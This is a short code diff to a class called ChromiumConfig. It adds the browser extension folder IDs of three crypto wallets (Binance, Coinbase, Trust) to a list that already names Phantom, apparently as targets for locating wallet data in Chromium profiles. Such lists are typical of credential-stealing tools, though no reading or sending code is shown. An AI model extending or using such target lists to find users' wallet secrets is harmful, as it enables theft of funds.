@@ -43,6 +43,18 @@ class ChromiumConfig:
         {
             "name": "Phantom",
             "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
+        },
+        {
+            "name": "Binance",
+            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
+        },
+        {
+            "name": "Coinbase",
+            "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]
+        },
+        {
+            "name": "Trust",
+            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
         }
     ]
 
